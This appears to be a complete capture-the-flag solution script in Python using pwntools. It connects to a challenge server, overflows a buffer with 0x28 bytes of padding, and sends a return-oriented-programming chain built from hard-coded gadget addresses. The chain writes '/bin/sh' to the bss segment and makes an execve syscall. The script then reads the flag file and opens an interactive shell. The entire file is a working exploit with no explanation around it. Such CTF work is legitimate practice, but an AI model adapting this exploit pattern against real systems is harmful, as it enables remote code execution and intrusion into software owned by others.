#!/usr/bin/env python
from pwn import *

# 

context.arch = 'amd64'

host , port = 'ctf.yuawn.idv.tw' , 10109
y = remote( host , port )

bss = 0x6cbb60
pop_rdi = 0x4014c6
pop_rsi = 0x4015e7
pop_rdx = 0x4429c6
pop_rax = 0x4bc748
mov_rdi_rsi = 0x47a6e2
syscall = 0x467395

p = flat(
    'D' * 0x28,
    pop_rsi,
    u64( '/bin/sh\x00' ),
    pop_rdi,
    bss,
    mov_rdi_rsi,
    pop_rsi,
    0x0,
    pop_rdx,
    0x0,
    pop_rax,
    0x3b,
    syscall
)

y.send( p )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()